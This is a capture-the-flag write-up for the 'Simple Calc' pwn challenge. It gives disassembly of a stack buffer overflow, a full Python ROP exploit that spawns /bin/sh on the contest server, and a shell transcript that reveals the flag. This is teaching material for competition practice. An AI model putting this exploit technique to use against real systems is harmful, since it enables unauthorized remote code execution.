# BKP : Simple Calc

### Author: ispo

This was a pretty easy challenge. The binary was a simple calculator (+, -, *, /). At the beginning,
program asks for the expected number of calculations:

    .text:00000000004013E9         lea     rax, [rbp+ncalc_14]
    .text:00000000004013ED         mov     rsi, rax
    .text:00000000004013F0         mov     edi, offset aD  ; "%d"
    .text:00000000004013F5         mov     eax, 0
    .text:00000000004013FA         call    __isoc99_scanf
    .text:00000000004013FF         mov     eax, 0
    .text:0000000000401404         call    handle_newline
    .text:0000000000401409         mov     eax, [rbp+ncalc_14]
    .text:000000000040140C         cmp     eax, 0FFh
    .text:0000000000401411         jg      short WRONG_NCALC_40141B
    .text:0000000000401413         mov     eax, [rbp+ncalc_14]
    .text:0000000000401416         cmp     eax, 3
    .text:0000000000401419         jg      short NCALC_OK_40142F
    .text:000000000040141B
    .text:000000000040141B WRONG_NCALC_40141B:             ; CODE XREF: main+8Ej
    .text:000000000040141B         mov     edi, offset aInvalidNumber_ ; "Invalid number."
    .text:0000000000401420         call    puts
    .text:0000000000401425         mov     eax, 0
    .text:000000000040142A         jmp     locret_401588
    .text:000000000040142F ; ---------------------------------------------------------------------------
    .text:000000000040142F
    .text:000000000040142F NCALC_OK_40142F:                ; CODE XREF: main+96j
    .text:000000000040142F         mov     eax, [rbp+ncalc_14]
    .text:0000000000401432         shl     eax, 2          ; allocate 4 bytes for each calculation
    .text:0000000000401435         cdqe
    .text:0000000000401437         mov     rdi, rax
    .text:000000000040143A         call    malloc

Then we allocate some memory big enough to hold the results (4 byte per results). We're allowed to
make from 3 to 255 calculations.

The vulnerability, was fairly easy to find and exploit:

    .text:0000000000401529         cmp     eax, 5
    .text:000000000040152C         jnz     short INVALID_OPT_40155D
    .text:000000000040152E         mov     eax, [rbp+ncalc_14]
    .text:0000000000401531         shl     eax, 2
    .text:0000000000401534         movsxd  rdx, eax
    .text:0000000000401537         mov     rcx, [rbp+ptr_10]
    .text:000000000040153B         lea     rax, [rbp+vuln_buf_40]
    .text:000000000040153F         mov     rsi, rcx
    .text:0000000000401542         mov     rdi, rax
    .text:0000000000401545         call    memcpy          ; overflow: vuln_buf is small
    .text:000000000040154A         mov     rax, [rbp+ptr_10]
    .text:000000000040154E         mov     rdi, rax
    .text:0000000000401551         call    free            ; pointer must be NULL to avoid crash ;)
    .text:0000000000401556         mov     eax, 0
    .text:000000000040155B         jmp     short locret_401588

Upon exit, we copy the results to a very small buffer:

	.text:0000000000401383 vuln_buf_40     = byte ptr -40h
	.text:0000000000401383 option_18       = dword ptr -18h
	.text:0000000000401383 ncalc_14        = dword ptr -14h
	.text:0000000000401383 ptr_10          = qword ptr -10h

Thus it's very easy to overflow the buffer and overwrite return address and get control of rip.
We have total control of the contents of the buffer, as they're the results of the caclulations,
which we control their arguments.

However there's a problem: Except the rip, we also overwrite rbp+ptr_10, which is the pointer
that holds the results in the heap. If this value is not a valid entry address of a heap buffer,
free() will crash. The first idea is to set it to NULL, so if there's a check for NULL pointer
as input at the beginning of free(), we'll immediately return. Fortunately this is true:

    .text:00000000004156D0         public free ; weak
    .text:00000000004156D0 free            proc near               ; CODE XREF: _i18n_number_rewrite+1EAp
    .text:00000000004156D0                         ; _i18n_number_rewrite_0+1EAp ...
    .text:00000000004156D0         mov     rax, cs:__free_hook
    .text:00000000004156D7         test    rax, rax
    .text:00000000004156DA         jnz     loc_41579A
    .text:00000000004156E0         test    rdi, rdi
    .text:00000000004156E3         jz      locret_415798

As you can see, rdi (1st argument), is checked if it's 0 (NULL) and if so, free() returns. Thus,
we can overwrite ptr with zeros and then directly overwrite rip.

However, for any type of calculation, input numbers must be >0x27 (unsigned):

    .text:00000000004010E0         mov     eax, cs:add_1_6C4A80
    .text:00000000004010E6         cmp     eax, 27h        ; number must be >= 50
    .text:00000000004010E9         jbe     short TOO_SMALL_4010F6
    .text:00000000004010EB         mov     eax, cs:add_2_6C4A84
    .text:00000000004010F1         cmp     eax, 27h
    .text:00000000004010F4         ja      short NUMS_OK_40110A

In order to have a result of 0, we have to give as input num1=X and num2=X and do a subtraction.
We need this because addresses are 8 bytes long and the 4-MSB must be NULL. Because DEP is
enabled, we need to ROP. Fortunately for us, binary is statically linked, so there are many
gadgets available. A /bin/sh shell is enough, so we can find our gadgets using ROPgadget.py.

The exploit is simple: fill buffer with zeros, overwrite rip with the address of the 1st gadgets,
add fill the rest of the stack with the ROP exploit. See the python code, for the complete attack.
The flag is BKPCTF{what_is_2015_minus_7547}.

### Code

    #!/usr/bin/env python2
    # --------------------------------------------------------------------------------------------------
    # Contest  : BostonKeyParty CTF 2016
    # Date     : 04/03 - 06/03/2015 (48hr)
    # Member   : ispo@b01lers
    # Challenge: Simple Calc (Pwn 5pt)
    # Protections: ASLR/DEP
    # Description: what a nice little calculator!
    #			   simplecalc.bostonkey.party 5400
    #
    # (NOTE: for a better view set tab width to 4)
    # --------------------------------------------------------------------------------------------------
    import struct
    import sys
    import socket
    import struct
    import telnetlib

    # --------------------------------------------------------------------------------------------------
    def push_addr( addr ):
    	# Write a 4 byte address to the stack (set 4 MSB to 0)
    	# Do a subtraction: 2*addr - addr = addr
    	return  '2' + '\n' + str(2*addr) + '\n' + str(addr) + '\n' +\
    			'2' + '\n' + '1337'      + '\n' + '1337'    + '\n'

    # --------------------------------------------------------------------------------------------------
    def push_value( addr ):							# write a 4 byte address to the stack
    	return  '2' + '\n' + str(2*addr) + '\n' + str(addr) + '\n'

    # --------------------------------------------------------------------------------------------------
    def recv_until(st):                             # receive until you encounter a string
      ret = ""
      while st not in ret:
        ret += s.recv(16384)
      return ret

    # --------------------------------------------------------------------------------------------------
    if __name__ == "__main__":

    	s = socket.create_connection(('simplecalc.bostonkey.party', 5400))
    #	s = socket.create_connection(('localhost', 7777))

    	recv_until('Expected number of calculations: ')

    	p  = '255' + '\n'							# allocate a big buffer

    	# Fill with zeros first
    	p += ('2' + '\n' + '1000' + '\n' + '1000' + '\n')*18

    	# ROP exploit
    	p += push_addr(0x0000000000401c87) 			# pop rsi ; ret
    	p += push_addr(0x00000000006c1060) 			# @ .data
    	p += push_addr(0x000000000044db34)			# pop rax ; ret

    	p += push_value(0x6e69622f) 				# '/bin'
    	p += push_value(0x68732f2f)					# '//sh'

    	p += push_addr(0x0000000000470f11) 			# mov qword ptr [rsi], rax ; ret
    	p += push_addr(0x0000000000401c87) 			# pop rsi ; ret
    	p += push_addr(0x00000000006c1068) 			# @ .data + 8
    	p += push_addr(0x000000000041c61f)	 		# xor rax, rax ; ret
    	p += push_addr(0x0000000000470f11) 			# mov qword ptr [rsi], rax ; ret
    	p += push_addr(0x0000000000401b73)			# pop rdi ; ret
    	p += push_addr(0x00000000006c1060) 			# @ .data
    	p += push_addr(0x0000000000401c87) 			# pop rsi ; ret
    	p += push_addr(0x00000000006c1068) 			# @ .data + 8
    	p += push_addr(0x0000000000437a85) 			# pop rdx ; ret
    	p += push_addr(0x00000000006c1068) 			# @ .data + 8
    	p += push_addr(0x000000000041c61f)			# xor rax, rax ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    	p += push_addr(0x0000000000400488) 			# syscall

    	p += '5' + '\n'								# exit
    	s.send( p ) 								# send payload

    	print ' *** Opening Shell *** '
    	t = telnetlib.Telnet()              		# try to open shell
    	t.sock = s
    	t.interact()

    	exit(0)


    root@xrysa:~/ctf/bostonkeyparty# ./simple_calc_expl.py
    	[..... TRUNCATED FOR BREVITY .....]
    	Options Menu:
    	 [1] Addition.
    	 [2] Subtraction.
    	 [3] Multiplication.
    	 [4] Division.
    	 [5] Save and Exit
    	.=> ls -la
    		total 1188
    		drwxr-xr-x 2 calc calc   4096 Mar  4 05:23 .
    		drwxr-xr-x 3 root root   4096 Mar  4 05:04 ..
    		-rw-r--r-- 1 calc calc    220 Mar  4 05:04 .bash_logout
    		-rw-r--r-- 1 calc calc   3637 Mar  4 05:04 .bashrc
    		-rw-r--r-- 1 calc calc    675 Mar  4 05:04 .profile
    		-rw-r--r-- 1 root root     32 Mar  4 05:23 key
    		-rwxr-xr-x 1 root root     80 Mar  4 05:14 run.sh
    		-rwxrwxr-x 1 calc calc 882266 Mar  4 05:04 simpleCalc
    		-rw-r--r-- 1 root root 302348 Feb  1  2014 socat_1.7.2.3-1_amd64.deb
    	whoami
    		nobody
    	cat key
    		BKPCTF{what_is_2015_minus_7547}
    	exit
    	*** Connection closed by remote host ***
